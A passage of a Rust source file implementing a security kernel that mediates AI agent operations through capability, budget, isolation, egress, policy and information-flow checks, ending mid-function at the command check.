//! Kernel decision engine — complete mediation with monotone session state.
//!
//! Every side effect an agent attempts must pass through [`Kernel::decide`].
//! The kernel maintains a monotone session: effective permissions can only
//! stay the same or tighten during execution. This is the enforcement
//! boundary described in the North Star.
//!
//! # Monotonicity Invariant
//!
//! For any sequence of decisions d₁, d₂, …, dₙ:
//!
//! ```text
//! effective(dᵢ₊₁) ≤ effective(dᵢ)
//! exposure(dᵢ) ⊆ exposure(dᵢ₊₁)          // exposure only grows
//! ```
//!
//! Authority never increases. Exposure never decreases. Budget is consumed.
//! Time advances. The trace is append-only.
//!
//! # Runtime Exposure Tracking
//!
//! The kernel tracks a [`ExposureSet`] accumulator across the session. Each
//! allowed operation contributes its exposure label (if any) to the set.
//! When the accumulated exposure would complete the uninhabitable_state
//! (private data + untrusted content + exfiltration vector), the kernel
//! **dynamically gates** exfiltration operations — requiring approval
//! even if the static lattice doesn't mandate it.
//!
//! This is the "exposureed-to-sink gating" described in the North Star:
//! static obligations catch structural risks, while runtime exposure catches
//! emergent risks from the actual sequence of operations.
//!
//! # Complete Mediation
//!
//! The kernel covers all side-effect categories:
//! - **File**: read, write, edit
//! - **Net**: web_fetch, web_search
//! - **Exec**: run_bash
//! - **Publish**: git_commit, git_push, create_pr
//! - **Search**: glob, grep
//! - **Orchestrate**: manage_pods
//!
//! # Example
//!
//! ```rust
//! use portcullis::kernel::{Kernel, Verdict};
//! use portcullis::{PermissionLattice, Operation};
//!
//! let perms = PermissionLattice::safe_pr_fixer();
//! let mut kernel = Kernel::new(perms);
//!
//! // Reading is allowed — token proves authorization
//! let (d, token) = kernel.decide(Operation::ReadFiles, "/workspace/main.rs");
//! assert!(matches!(d.verdict, Verdict::Allow));
//! assert!(token.is_some());
//! drop(token); // consume the token
//!
//! // Git push is structurally denied — no token
//! let (d, token) = kernel.decide(Operation::GitPush, "origin/main");
//! assert!(matches!(d.verdict, Verdict::Deny(_)));
//! assert!(token.is_none());
//!
//! // Trace is append-only
//! assert_eq!(kernel.trace().len(), 2);
//! ```

use chrono::{DateTime, Utc};
use rust_decimal::Decimal;
use uuid::Uuid;

#[cfg(feature = "serde")]
use serde::{Deserialize, Serialize};

use crate::capability::{CapabilityLevel, Operation};
use crate::certificate::VerifiedPermissions;
use crate::exposure_core;
use crate::guard::{ExposureLabel, ExposureSet};
use crate::isolation::{IsolationLattice, NetworkIsolation};
use crate::lattice::PermissionLattice;
use crate::receipt_chain::{ReceiptChain, VerdictReceipt};
use crate::token::SessionProvenance;

/// A single decision made by the kernel.
///
/// Captures the operation, subject, verdict, and a snapshot of the
/// permission state before and after the decision — including exposure.
#[derive(Debug, Clone)]
#[cfg_attr(feature = "serde", derive(Serialize, Deserialize))]
pub struct Decision {
    /// Unique decision ID.
    pub id: Uuid,
    /// Monotonically increasing sequence number within the session.
    pub sequence: u64,
    /// The operation requested.
    pub operation: Operation,
    /// The subject of the operation (path, URL, command, etc.).
    pub subject: String,
    /// The verdict: allow, deny, or require approval.
    pub verdict: Verdict,
    /// Timestamp of the decision.
    pub timestamp: DateTime<Utc>,
    /// SHA-256 hash of effective permissions before this decision.
    pub pre_permissions_hash: String,
    /// SHA-256 hash of effective permissions after this decision.
    pub post_permissions_hash: String,
    /// Exposure state transition caused by this decision.
    #[cfg_attr(feature = "serde", serde(alias = "taint_transition"))]
    pub exposure_transition: ExposureTransition,
    /// If this decision was made via `decide_with_parents()`, the NodeId
    /// assigned in the causal DAG. `None` for flat `decide()` calls.
    #[cfg_attr(
        feature = "serde",
        serde(default, skip_serializing_if = "Option::is_none")
    )]
    pub flow_node_id: Option<u64>,
}

/// Records the exposure state before and after a decision.
///
/// For allowed operations that carry a exposure label, `post` will have
/// that label added. For denied operations, exposure does not advance
/// (the operation didn't execute).
#[derive(Debug, Clone, PartialEq, Eq)]
#[cfg_attr(feature = "serde", derive(Serialize, Deserialize))]
pub struct ExposureTransition {
    /// Exposure legs active before this decision.
    pub pre_count: u8,
    /// Exposure legs active after this decision.
    pub post_count: u8,
    /// The exposure label contributed by this operation, if any.
    pub contributed_label: Option<ExposureLabel>,
    /// Whether the uninhabitable_state was completed by this decision.
    #[cfg_attr(feature = "serde", serde(alias = "trifecta_completed"))]
    pub state_uninhabitable: bool,
    /// Whether a dynamic exposure gate was applied (RequiresApproval
    /// due to runtime exposure, not static obligations).
    pub dynamic_gate_applied: bool,
}

/// The kernel's verdict on an operation.
#[derive(Debug, Clone, PartialEq, Eq)]
#[cfg_attr(feature = "serde", derive(Serialize, Deserialize))]
#[cfg_attr(feature = "serde", serde(tag = "type", rename_all = "snake_case"))]
pub enum Verdict {
    /// Operation is allowed without additional approval.
    Allow,
    /// Operation requires explicit approval before proceeding.
    RequiresApproval,
    /// Operation is denied.
    Deny(DenyReason),
}

impl Verdict {
    /// Returns true if the operation can proceed (Allow or RequiresApproval).
    pub fn is_allowed(&self) -> bool {
        matches!(self, Verdict::Allow)
    }

    /// Returns true if the operation is denied.
    pub fn is_denied(&self) -> bool {
        matches!(self, Verdict::Deny(_))
    }
}

/// Reason an operation was denied.
#[derive(Debug, Clone, PartialEq, Eq)]
#[cfg_attr(feature = "serde", derive(Serialize, Deserialize))]
#[cfg_attr(feature = "serde", serde(tag = "reason", rename_all = "snake_case"))]
pub enum DenyReason {
    /// The capability level for this operation is `Never`.
    InsufficientCapability,
    /// The budget has been exhausted.
    BudgetExhausted {
        /// Remaining budget in USD.
        remaining_usd: String,
    },
    /// The session time window has expired.
    TimeExpired {
        /// When the session expired.
        expired_at: DateTime<Utc>,
    },
    /// The path is blocked by path restrictions.
    PathBlocked {
        /// The blocked path.
        path: String,
    },
    /// The command is blocked by command restrictions.
    CommandBlocked {
        /// The blocked command.
        command: String,
    },
    /// Runtime isolation does not meet the policy's minimum requirement.
    IsolationInsufficient {
        /// The required minimum isolation level.
        required: String,
        /// The actual runtime isolation level.
        actual: String,
    },
    /// Operation is denied by defense-in-depth isolation gating.
    ///
    /// Even if the capability lattice allows the operation, the runtime
    /// isolation level makes it physically impossible or unsafe (e.g.,
    /// web_fetch in an airgapped network).
    IsolationGated {
        /// The isolation dimension that blocks this operation.
        dimension: String,
    },
    /// Operation denied by egress policy.
    ///
    /// The operation would contact a host not permitted by the egress policy
    /// (`.nucleus/egress.toml`). The message includes the blocked host and
    /// the policy's allowed hosts for actionable remediation.
    EgressBlocked {
        /// The host that was blocked.
        host: String,
        /// Human-readable reason from the egress policy.
        policy_reason: String,
    },
    /// Operation denied by an admissibility policy rule.
    ///
    /// The `PolicyRuleSet` evaluated the operation's sink class against
    /// source/artifact labels and a matching rule denied the action.
    PolicyDenied {
        /// Name of the rule that caused the denial.
        rule_name: String,
        /// The sink class that was denied.
        sink_class: String,
    },
    /// Operation denied by enterprise allowlist policy.
    ///
    /// The enterprise allowlist (loaded from `.nucleus/enterprise.toml`)
    /// acts as an organizational ceiling: even if local config would allow
    /// the operation, the enterprise policy denies it.
    EnterpriseBlocked {
        /// The sink class that was blocked.
        sink_class: String,
        /// Human-readable detail for the denial.
        detail: String,
    },
    /// Information flow control violation.
    ///
    /// The session's accumulated IFC label violates a flow enforcement rule.
    /// Checked via `enable_flow_control()` (flat) or `decide_with_parents()` (DAG).
    FlowViolation {
        /// Which flow rule was violated (e.g., "Exfiltration", "AuthorityEscalation").
        rule: String,
        /// Causal chain receipt when the violation came from `decide_with_parents()`.
        /// Shows exactly which ancestor nodes contributed the taint.
        #[cfg_attr(
            feature = "serde",
            serde(default, skip_serializing_if = "Option::is_none")
        )]
        receipt: Option<String>,
    },
}

/// The source of a RequiresApproval verdict.
#[derive(Debug, Clone, PartialEq, Eq)]
#[cfg_attr(feature = "serde", derive(Serialize, Deserialize))]
#[cfg_attr(feature = "serde", serde(tag = "source", rename_all = "snake_case"))]
pub enum ApprovalSource {
    /// Static obligation from the permission lattice (uninhabitable_state in lattice structure).
    StaticObligation,
    /// Dynamic exposure gate — runtime exposure accumulation completed the uninhabitable_state.
    #[cfg_attr(feature = "serde", serde(alias = "dynamic_taint"))]
    DynamicExposure {
        /// The exposure label that would complete the uninhabitable_state.
        completing_label: ExposureLabel,
    },
}

/// Proof that Kernel::decide() returned Allow.
///
/// This token is:
/// - **Linear**: non-Clone, non-Copy — cannot be reused
/// - **#[must_use]**: compiler warns if dropped without consumption
/// - **Sealed**: private _seal field prevents external construction
///
/// Only Kernel::decide() can create this token. Kani proof
/// `proof_decision_token_unforgeable` verifies no other construction path exists.
#[must_use = "DecisionToken must be consumed by executing the authorized operation"]
pub struct DecisionToken {
    /// The operation this token authorizes.
    pub(crate) operation: Operation,
    /// The decision sequence number for audit correlation.
    pub(crate) sequence: u64,
    /// Prevents external construction.
    _seal: (),
}

impl DecisionToken {
    /// The operation this token authorizes.
    pub fn operation(&self) -> Operation {
        self.operation
    }

    /// The decision sequence number for audit correlation.
    pub fn sequence(&self) -> u64 {
        self.sequence
    }
}

impl std::fmt::Debug for DecisionToken {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("DecisionToken")
            .field("operation", &self.operation)
            .field("sequence", &self.sequence)
            .finish_non_exhaustive()
    }
}

/// Error when attempting to violate monotonicity.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct MonotoneViolation {
    /// The dimension that would increase.
    pub dimension: String,
    /// Description of the violation.
    pub details: String,
}

impl std::fmt::Display for MonotoneViolation {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(
            f,
            "monotone violation in {}: {}",
            self.dimension, self.details
        )
    }
}

impl std::error::Error for MonotoneViolation {}

/// The kernel decision engine.
///
/// Maintains monotone session state and provides complete mediation
/// for all agent operations. Every side effect must pass through
/// [`Kernel::decide`].
///
/// # Thread Safety
///
/// The kernel is not `Sync` — it maintains mutable session state.
/// For concurrent access, wrap in a `Mutex` or use message passing.
pub struct Kernel {
    /// Session ID.
    session_id: Uuid,
    /// Current effective permissions (can only decrease via meet).
    effective: PermissionLattice,
    /// Initial permissions (for audit comparison).
    initial_hash: String,
    /// Runtime isolation level — immutable for the session lifetime.
    ///
    /// The kernel uses this for defense-in-depth: even if the capability
    /// lattice allows an operation, the isolation level can deny it
    /// (e.g., network operations in an airgapped environment).
    isolation: IsolationLattice,
    /// Append-only session trace.
    trace: Vec<Decision>,
    /// Next sequence number.
    next_seq: u64,
    /// Budget consumed so far (USD).
    consumed_usd: Decimal,
    /// Pre-granted approvals: operation → remaining count.
    approvals: std::collections::BTreeMap<Operation, u32>,
    /// Runtime exposure accumulator — monotonically growing.
    ///
    /// Records which exposure legs have been touched by allowed operations.
    /// When this reaches uninhabitable, exfil operations get dynamically gated.
    exposure: ExposureSet,
    /// Optional provenance linking this session to a delegation certificate.
    ///
    /// Present when the kernel was created from a verified certificate via
    /// [`Kernel::from_certificate`]. Provides an auditable chain from every
    /// decision back to the root authority.
    provenance: Option<SessionProvenance>,
    /// Flow label accumulator — tracks information flow control labels across
    /// the session. When enabled, `decide()` runs `check_flow` as an additional
    /// defense-in-depth gate after all existing checks.
    ///
    /// The label is the join (least upper bound) of all intrinsic labels
    /// for operations allowed in this session. It monotonically accumulates
    /// taint: once web content is read, the session label gains `Adversarial`
    /// integrity and `NoAuthority` authority.
    flow_label: Option<portcullis_core::IFCLabel>,
    /// Optional causal DAG for precise per-action flow tracking.
    ///
    /// When enabled via `enable_flow_graph()`, `decide_with_parents()`
    /// checks flow against actual causal dependencies instead of the
    /// flat session-level label. This eliminates over-tainting.
    flow_graph: Option<crate::flow_graph::FlowGraph>,
    /// Declassification rules applied to flow labels before checking.
    ///
    /// Must be declared before the session starts (monotonicity of rule set).
    /// Each application produces an audit entry in the trace.
    declassification_rules: Vec<portcullis_core::declassify::DeclassificationRule>,
    /// Optional egress policy — when present, operations that contact the
    /// network are checked against the allowed/denied host lists.
    ///
    /// Loaded from `.nucleus/egress.toml`. When `None`, no egress filtering
    /// is applied (all hosts are allowed).
    #[cfg(feature = "spec")]
    egress_policy: Option<crate::egress_policy::EgressPolicy>,
    /// Optional admissibility policy rules — when present, `decide()` evaluates
    /// operations against source/artifact/sink predicates after egress checks.
    ///
    /// Loaded from `.nucleus/policy.toml`. When `None`, no admissibility
    /// filtering is applied (all operations pass through to capability checks).
    #[cfg(feature = "spec")]
    policy_rules: Option<portcullis_core::policy_rules::PolicyRuleSet>,
    /// Optional enterprise allowlist — organizational ceiling on all decisions.
    ///
    /// When present, `decide()` checks each operation's sink class against
    /// the enterprise policy. Denied sinks are blocked regardless of local
    /// config. Loaded from `.nucleus/enterprise.toml`.
    enterprise: Option<portcullis_core::enterprise::EnterpriseAllowlist>,
    /// Optional Ed25519 signing key for receipt signing.
    ///
    /// When present, `decide_with_parents()` produces signed receipts
    /// that downstream consumers can verify.
    #[cfg(feature = "crypto")]
    signing_key: Option<std::sync::Arc<ring::signature::Ed25519KeyPair>>,
    /// Optional append-only receipt chain for verdict attestation.
    ///
    /// When enabled via [`Kernel::enable_receipt_chain`], every call to
    /// `decide()` appends a [`VerdictReceipt`] to this chain, creating a
    /// tamper-evident log of all kernel verdicts. The chain is hash-linked:
    /// each receipt commits to its predecessor's hash.
    receipt_chain: Option<ReceiptChain>,
}

impl Kernel {
    /// Create a new kernel with the given initial permissions.
    ///
    /// The initial permissions set the ceiling — effective permissions
    /// can only stay the same or decrease from here. Uses localhost
    /// isolation level (no isolation constraints enforced).
    pub fn new(initial: PermissionLattice) -> Self {
        Self::with_isolation(initial, IsolationLattice::localhost())
    }

    /// Create a new kernel with explicit isolation level.
    ///
    /// The isolation level is immutable for the session lifetime.
    /// It enables defense-in-depth checks: network operations are denied
    /// in airgapped environments, regardless of capability levels.
    ///
    /// If the policy's `minimum_isolation` exceeds the runtime isolation,
    /// ALL operations will be denied.
    pub fn with_isolation(initial: PermissionLattice, isolation: IsolationLattice) -> Self {
        let initial_hash = initial.checksum();
        Self {
            session_id: Uuid::new_v4(),
            effective: initial,
            initial_hash,
            isolation,
            trace: Vec::new(),
            next_seq: 0,
            consumed_usd: Decimal::ZERO,
            approvals: std::collections::BTreeMap::new(),
            exposure: ExposureSet::empty(),
            provenance: None,
            flow_label: None,
            flow_graph: None,
            declassification_rules: Vec::new(),
            #[cfg(feature = "spec")]
            egress_policy: None,
            #[cfg(feature = "spec")]
            policy_rules: None,
            enterprise: None,
            #[cfg(feature = "crypto")]
            signing_key: None,
            receipt_chain: None,
        }
    }

    /// Enable information flow control for this session.
    ///
    /// When enabled, `decide()` accumulates IFC labels and runs `check_flow`
    /// as a defense-in-depth gate. The initial label is the least restrictive
    /// (bottom of the label lattice).
    pub fn enable_flow_control(&mut self) {
        let now = chrono::Utc::now().timestamp() as u64;
        // Initialize with user_prompt label (Trusted, Directive) at current time.
        // Do NOT use bottom() — its observed_at=0 poisons freshness joins,
        // making the first WebFetch always-expired.
        self.flow_label = Some(portcullis_core::IFCLabel::user_prompt(now));
    }

    /// Enable the causal DAG for precise per-action flow tracking.
    ///
    /// When enabled, `decide_with_parents()` tracks actual data dependencies
    /// instead of using the flat session-level label. This eliminates
    /// over-tainting: actions that don't causally depend on untrusted data
    /// are unaffected by it.
    ///
    /// The flat `decide()` still works as before — the DAG is only used
    /// when callers explicitly provide parent node IDs.
    pub fn enable_flow_graph(&mut self) {
        self.flow_graph = Some(crate::flow_graph::FlowGraph::new());
    }

    /// Enable the receipt chain for verdict attestation.
    ///
    /// When enabled, every `decide()` call appends a [`VerdictReceipt`] to an
    /// append-only, hash-linked chain. The chain provides a tamper-evident log
    /// of all kernel verdicts that can be verified offline.
    ///
    /// Call this before the first `decide()` to capture the complete session history.
    pub fn enable_receipt_chain(&mut self) {
        self.receipt_chain = Some(ReceiptChain::new());
    }

    /// Read-only access to the receipt chain, if enabled.
    ///
    /// Returns `None` if `enable_receipt_chain()` was not called.
    pub fn receipt_chain(&self) -> Option<&ReceiptChain> {
        self.receipt_chain.as_ref()
    }

    /// Add a declassification rule to this session.
    ///
    /// Rules must be added before the session starts processing operations.
    /// Each rule that fires during flow checking produces an audit-visible
    /// label modification. Rules cannot escalate — only controlled downgrading
    /// in the direction specified by the rule type.
    pub fn add_declassification_rule(
        &mut self,
        rule: portcullis_core::declassify::DeclassificationRule,
    ) {
        self.declassification_rules.push(rule);
    }

    /// Set the Ed25519 signing key for receipt signing.
    ///
    /// When set, `decide_with_parents()` produces cryptographically signed
    /// receipts that downstream audit systems can verify.
    #[cfg(feature = "crypto")]
    pub fn set_signing_key(&mut self, key: std::sync::Arc<ring::signature::Ed25519KeyPair>) {
        self.signing_key = Some(key);
    }

    /// Record a data-source observation in the causal DAG.
    ///
    /// Returns the `NodeId` for use as a parent in subsequent `observe()`
    /// Read-only access to the flow graph (for receipt construction).
    pub fn flow_graph(&self) -> Option<&crate::flow_graph::FlowGraph> {
        self.flow_graph.as_ref()
    }

    /// or `decide_with_parents()` calls. Observations are not flow-checked —
    /// they just record what data entered the session.
    ///
    /// Returns `Err` if the flow graph is not enabled or if parent validation
    /// fails. Callers must handle the error — do not use `.unwrap_or(0)` as
    /// node ID 0 is the sentinel and will be rejected.
    pub fn observe(
        &mut self,
        kind: portcullis_core::flow::NodeKind,
        parents: &[u64],
    ) -> Result<u64, crate::flow_graph::FlowGraphError> {
        let graph = self
            .flow_graph
            .as_mut()
            .ok_or(crate::flow_graph::FlowGraphError::GraphNotEnabled)?;
        let now = chrono::Utc::now().timestamp() as u64;
        let node_id = graph.insert_observation(kind, parents, now)?;

        // Apply declassification rules to the observation's label.
        // This is where controlled downgrading happens — e.g., a validated
        // search tool's output gets Adversarial → Untrusted integrity.
        if !self.declassification_rules.is_empty() {
            if let Some(node) = graph.get(node_id) {
                let mut label = node.label;
                for rule in &self.declassification_rules {
                    let result = rule.apply(label);
                    if result.applied {
                        label = result.label;
                    }
                }
                graph.modify_label(node_id, label);
            }
        }

        Ok(node_id)
    }

    /// Decide an operation with explicit causal parents from the DAG.
    ///
    /// Like `decide()`, but instead of using the flat session-level label,
    /// computes the flow label from the specified parent nodes. This means
    /// an action depending only on local files won't be blocked by web
    /// content read elsewhere in the session.
    ///
    /// Falls back to `decide()` if the flow graph is not enabled.
    pub fn decide_with_parents(
        &mut self,
        operation: Operation,
        subject: &str,
        parents: &[u64],
    ) -> (Decision, Option<DecisionToken>) {
        let graph = match self.flow_graph.as_mut() {
            Some(g) => g,
            None => return self.decide(operation, subject),
        };

        let now = chrono::Utc::now().timestamp() as u64;

        // Insert action into the DAG — atomic check-and-insert
        let flow_decision = match graph.insert_action(operation, parents, now) {
            Ok(fd) => fd,
            Err(e) => {
                // Parent validation failed — deny with error context
                let pre_hash = self.effective.checksum();
                let pre_exposure_count = self.exposure.count();
                let contributed_label = exposure_core::classify_operation(operation);
                return self.record_with_exposure(
                    operation,
                    subject,
                    Verdict::Deny(DenyReason::FlowViolation {
                        rule: format!("DAG error: {:?}", e),
                        receipt: None,
                    }),
                    &pre_hash,
                    pre_exposure_count,
                    contributed_label,
                    false,
                    false,
                );
            }
        };

        // If the DAG says deny, short-circuit with a receipt
        if let portcullis_core::flow::FlowVerdict::Deny(reason) = flow_decision.verdict {
            let receipt_str = graph
                .build_receipt_for(flow_decision.node_id, now)
                .map(|mut r| {
                    // Sign the receipt if a signing key is available
                    #[cfg(feature = "crypto")]
                    if let Some(ref key) = self.signing_key {
                        crate::receipt_sign::sign_receipt(&mut r, key);
                    }
                    r.display_chain()
                });
            let pre_hash = self.effective.checksum();
            let pre_exposure_count = self.exposure.count();
            let contributed_label = exposure_core::classify_operation(operation);
            let mut result = self.record_with_exposure(
                operation,
                subject,
                Verdict::Deny(DenyReason::FlowViolation {
                    rule: format!("{:?}", reason),
                    receipt: receipt_str,
                }),
                &pre_hash,
                pre_exposure_count,
                contributed_label,
                false,
                false,
            );
            result.0.flow_node_id = Some(flow_decision.node_id);
            return result;
        }

        // DAG says allow — delegate to standard decide() for remaining checks
        // (budget, capability, path, command, exposure, approvals).
        //
        // Temporarily disable the flat flow_label so decide() doesn't re-check
        // flow with the session-level accumulator. The DAG's per-action verdict
        // supersedes the flat label — that's the whole point of the DAG.
        //
        // FIX #369: After decide(), monotonically join the saved label with
        // any label that decide() computed (labels only grow).
        // FIX #373: Explicit restoration in all code paths. If decide()
        // panics (unlikely but possible), flow_label stays None — this is
        // fail-closed (flow checks fail on None, blocking all operations).
        let saved_flow_label = self.flow_label.take();
        let mut result = self.decide(operation, subject);

        // Monotonic restore: join saved label with post-decide label (#369)
        let post_label = self.flow_label.take();
        self.flow_label = match (saved_flow_label, post_label) {
            (Some(saved), Some(decided)) => Some(saved.join(decided)),
            (Some(saved), None) => Some(saved),
            (None, decided) => decided,
        };

        result.0.flow_node_id = Some(flow_decision.node_id);
        result
    }

    /// Create a kernel session from cryptographically verified permissions.
    ///
    /// The [`VerifiedPermissions`] type is sealed — it can only be produced
    /// by [`verify_certificate`], guaranteeing that the permissions were
    /// cryptographically verified before the kernel was created.
    ///
    /// The kernel records the certificate fingerprint and delegation chain
    /// metadata as [`SessionProvenance`], linking every subsequent decision
    /// back to the root authority.
    ///
    /// # Arguments
    ///
    /// * `verified` — Cryptographically verified permissions from a delegation certificate.
    /// * `certificate_fingerprint` — SHA-256 fingerprint of the source certificate.
    pub fn from_certificate(
        verified: VerifiedPermissions,
        certificate_fingerprint: [u8; 32],
    ) -> Self {
        let provenance = SessionProvenance {
            certificate_fingerprint,
            root_identity: verified.root_identity.clone(),
            leaf_identity: verified.leaf_identity.clone(),
            chain_depth: verified.chain_depth,
        };
        let initial_hash = verified.effective.checksum();
        Self {
            session_id: Uuid::new_v4(),
            effective: verified.effective,
            initial_hash,
            isolation: IsolationLattice::localhost(),
            trace: Vec::new(),
            next_seq: 0,
            consumed_usd: Decimal::ZERO,
            approvals: std::collections::BTreeMap::new(),
            exposure: ExposureSet::empty(),
            provenance: Some(provenance),
            flow_label: None,
            flow_graph: None,
            declassification_rules: Vec::new(),
            #[cfg(feature = "spec")]
            egress_policy: None,
            #[cfg(feature = "spec")]
            policy_rules: None,
            enterprise: None,
            #[cfg(feature = "crypto")]
            signing_key: None,
            receipt_chain: None,
        }
    }

    /// Create a kernel session from verified certificate with explicit isolation.
    ///
    /// Combines [`from_certificate`] with [`with_isolation`] — the kernel
    /// uses the certificate's effective permissions AND enforces the given
    /// isolation level for defense-in-depth.
    pub fn from_certificate_with_isolation(
        verified: VerifiedPermissions,
        certificate_fingerprint: [u8; 32],
        isolation: IsolationLattice,
    ) -> Self {
        let provenance = SessionProvenance {
            certificate_fingerprint,
            root_identity: verified.root_identity.clone(),
            leaf_identity: verified.leaf_identity.clone(),
            chain_depth: verified.chain_depth,
        };
        let initial_hash = verified.effective.checksum();
        Self {
            session_id: Uuid::new_v4(),
            effective: verified.effective,
            initial_hash,
            isolation,
            trace: Vec::new(),
            next_seq: 0,
            consumed_usd: Decimal::ZERO,
            approvals: std::collections::BTreeMap::new(),
            exposure: ExposureSet::empty(),
            provenance: Some(provenance),
            flow_label: None,
            flow_graph: None,
            declassification_rules: Vec::new(),
            #[cfg(feature = "spec")]
            egress_policy: None,
            #[cfg(feature = "spec")]
            policy_rules: None,
            enterprise: None,
            #[cfg(feature = "crypto")]
            signing_key: None,
            receipt_chain: None,
        }
    }

    /// The core decision function. Complete mediation.
    ///
    /// Every operation the agent attempts must pass through this function.
    /// The kernel checks:
    ///
    /// 0. **Isolation**: Does the runtime isolation meet the policy's minimum?
    /// 1. **Time**: Is the session still within its validity window?
    /// 2. **Budget**: Has the cost ceiling been reached?
    /// 3. **Capability**: Is the operation allowed at the current level?
    ///    - **Isolation gate**: Defense-in-depth — is the operation physically
    ///      possible given the isolation level? (e.g., no network in airgap)
    ///    - **Enterprise**: Is the sink class allowed by the enterprise ceiling?
    /// 4. **Path**: Is the subject path accessible?
    /// 5. **Command**: Is the command allowed?
    /// 6. **Static approval**: Does the lattice mandate approval?
    /// 7. **Dynamic exposure gate**: Would this op complete the uninhabitable_state at runtime?
    ///
    /// For allowed operations, exposure is recorded in the accumulator.
    /// The decision (including exposure transition) is recorded in the append-only trace.
    ///
    /// Returns a `(Decision, Option<DecisionToken>)` pair. The token is `Some`
    /// only when the verdict is `Allow`, providing a linear proof that the
    /// operation was authorized. The token is non-Clone, non-Copy, and
    /// `#[must_use]` — it must be consumed by executing the authorized operation.
    pub fn decide(
        &mut self,
        operation: Operation,
        subject: &str,
    ) -> (Decision, Option<DecisionToken>) {
        let pre_hash = self.effective.checksum();
        let pre_exposure_count = self.exposure.count();
        let contributed_label = exposure_core::classify_operation(operation);

        // 0. Isolation minimum check — does runtime isolation meet policy requirement?
        if let Some(ref minimum) = self.effective.minimum_isolation {
            if !self.isolation.at_least(minimum) {
                return self.record_with_exposure(
                    operation,
                    subject,
                    Verdict::Deny(DenyReason::IsolationInsufficient {
                        required: format!("{}", minimum),
                        actual: format!("{}", self.isolation),
                    }),
                    &pre_hash,
                    pre_exposure_count,
                    contributed_label,
                    false,
                    false,
                );
            }
        }

        // 1. Time check
        let now = Utc::now();
        if now > self.effective.time.valid_until {
            return self.record_with_exposure(
                operation,
                subject,
                Verdict::Deny(DenyReason::TimeExpired {
                    expired_at: self.effective.time.valid_until,
                }),
                &pre_hash,
                pre_exposure_count,
                contributed_label,
                false,
                false,
            );
        }

        // 2. Budget check
        if self.consumed_usd >= self.effective.budget.max_cost_usd {
            return self.record_with_exposure(
                operation,
                subject,
                Verdict::Deny(DenyReason::BudgetExhausted {
                    remaining_usd: (self.effective.budget.max_cost_usd - self.consumed_usd)
                        .to_string(),
                }),
                &pre_hash,
                pre_exposure_count,
                contributed_label,
                false,
                false,
            );
        }

        // 3. Capability level check
        let level = self.effective.capabilities.level_for(operation);
        if level == CapabilityLevel::Never {
            return self.record_with_exposure(
                operation,
                subject,
                Verdict::Deny(DenyReason::InsufficientCapability),
                &pre_hash,
                pre_exposure_count,
                contributed_label,
                false,
                false,
            );
        }

        // 3b. Defense-in-depth isolation gate.
        //
        // Even if the capability lattice allows the operation, the runtime
        // isolation level may make it physically impossible or unsafe.
        // Belt-and-suspenders: the lattice says "allowed", the isolation says "impossible".
        if is_network_operation(operation) && self.isolation.network == NetworkIsolation::Airgapped
        {
            return self.record_with_exposure(
                operation,
                subject,
                Verdict::Deny(DenyReason::IsolationGated {
                    dimension: "network=airgapped".to_string(),
                }),
                &pre_hash,
                pre_exposure_count,
                contributed_label,
                false,
                false,
            );
        }

        // 3c. Egress policy check — host-level filtering for network operations.
        //
        // When an egress policy is loaded, operations that contact the network
        // are checked against the allowed/denied host lists. Default-deny:
        // any host not in the allowlist is blocked.
        //
        // For RunBash: extract destinations from the command string.
        // For WebFetch: extract host from the URL subject.
        // For GitPush/CreatePr: extract host from the remote URL subject.
        #[cfg(feature = "spec")]
        if let Some(ref egress) = self.egress_policy {
            if let Some(denial) = check_egress(operation, subject, egress) {
                return self.record_with_exposure(
                    operation,
                    subject,
                    Verdict::Deny(denial),
                    &pre_hash,
                    pre_exposure_count,
                    contributed_label,
                    false,
                    false,
                );
            }
        }

        // 3d. Admissibility policy check — declarative source/artifact/sink rules.
        //
        // When a PolicyRuleSet is loaded, evaluate the operation's sink class
        // against source/artifact label predicates. The policy is fail-closed:
        // if rules are present and no rule matches, the operation is denied.
        //
        // Source labels come from the causal flow graph (if enabled) or the
        // flat session label. When neither is enabled, the policy is evaluated
        // with empty source labels (vacuously true for source predicates).
        #[cfg(feature = "spec")]
        if let Some(ref policy_rules) = self.policy_rules {
            use portcullis_core::policy_rules::RuleVerdict;

            let sink = crate::hook_adapter::classify_sink(operation, subject);

            // Gather source/artifact labels from the flow state.
            let (source_labels, artifact_label) = self.policy_flow_labels();

            let eval = policy_rules.evaluate(&source_labels, &artifact_label, sink);
            match eval.verdict {
                RuleVerdict::Allow => {} // pass through to remaining checks
                RuleVerdict::Deny => {
                    return self.record_with_exposure(
                        operation,
                        subject,
                        Verdict::Deny(DenyReason::PolicyDenied {
                            rule_name: if eval.rule_name.is_empty() {
                                "(default deny)".to_string()
                            } else {
                                eval.rule_name
                            },
                            sink_class: format!("{sink:?}"),
                        }),
                        &pre_hash,
                        pre_exposure_count,
                        contributed_label,
                        false,
                        false,
                    );
                }
                RuleVerdict::RequiresApproval => {
                    // Check if there's a pre-granted approval
                    if !self.consume_approval(operation) {
                        return self.record_with_exposure(
                            operation,
                            subject,
                            Verdict::RequiresApproval,
                            &pre_hash,
                            pre_exposure_count,
                            contributed_label,
                            false,
                            false,
                        );
                    }
                    // Approved — fall through to remaining checks
                }
            }
        }

        // 3e. Enterprise allowlist check — organizational ceiling on sink classes.
        //
        // When an enterprise allowlist is loaded, the operation's sink class
        // is checked against the enterprise policy. Deny-takes-precedence:
        // if the sink is in `denied_sinks`, it is blocked regardless of local
        // config. This is the enforcement half of enterprise.rs (schema + check).
        if let Some(ref enterprise) = self.enterprise {
            let sink = crate::hook_adapter::classify_sink(operation, subject);
            if !enterprise.check_sink(sink) {
                return self.record_with_exposure(
                    operation,
                    subject,
                    Verdict::Deny(DenyReason::EnterpriseBlocked {
                        sink_class: format!("{sink:?}"),
                        detail: format!("enterprise policy denies sink class {:?}", sink,),
                    }),
                    &pre_hash,
                    pre_exposure_count,
                    contributed_label,
                    false,
                    false,
                );
            }
        }

        // 4. Path check (for file operations)
        if is_path_operation(operation)
            && !self
                .effective
                .paths
                .can_access(std::path::Path::new(subject))
        {
            return self.record_with_exposure(
                operation,
                subject,
                Verdict::Deny(DenyReason::PathBlocked {
                    path: subject.to_string(),
                }),
                &pre_hash,
                pre_exposure_count,
                contributed_label,
                false,
                false,
            );
        }

        // 5. Command check (for exec operations)
        if operation == Operation::RunBash && !self.effective.commands.can_execute(subject) {
            return self.record_with_exposure(
                operation,
                subject,
